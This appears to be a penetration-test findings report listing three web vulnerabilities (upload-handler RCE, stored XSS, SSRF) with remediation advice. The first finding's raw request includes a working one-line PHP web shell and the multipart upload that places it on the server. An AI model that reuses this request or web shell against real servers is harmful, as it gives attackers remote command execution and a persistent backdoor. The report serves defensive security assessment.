findings.title: Unauthenticated remote code execution in file upload handler
findings.description: The /upload endpoint writes the client supplied filename to disk without sanitisation, which allows a PHP web shell to be dropped and executed.
findings.remediation: Validate and normalise uploaded filenames, store uploads outside the web root and disable script execution in the upload directory.
findings.evidence_explanation: A PHP web shell was uploaded and executed with the id command, confirming code execution as www-data.
findings.raw_request:
POST /upload HTTP/1.1
Host: app.example.test
Content-Type: multipart/form-data; boundary=x

--x
Content-Disposition: form-data; name="file"; filename="shell.php"

<?php system($_GET['cmd']); ?>
--x--

findings.title: Stored cross-site scripting in profile display name
findings.description: The display name is rendered unescaped on the public profile page, so a script payload saved in the field executes for every visitor.
findings.remediation: HTML-encode user supplied values on output and add a restrictive Content-Security-Policy.
findings.evidence_explanation: The payload was stored and reflected unescaped in the profile HTML.

findings.title: Server-side request forgery in URL preview feature
findings.description: The link preview fetcher follows user supplied URLs, including internal addresses. Reaching the cloud metadata service could not be confirmed.
findings.remediation: Resolve and validate the target host against an allow list and block link-local and private address ranges.
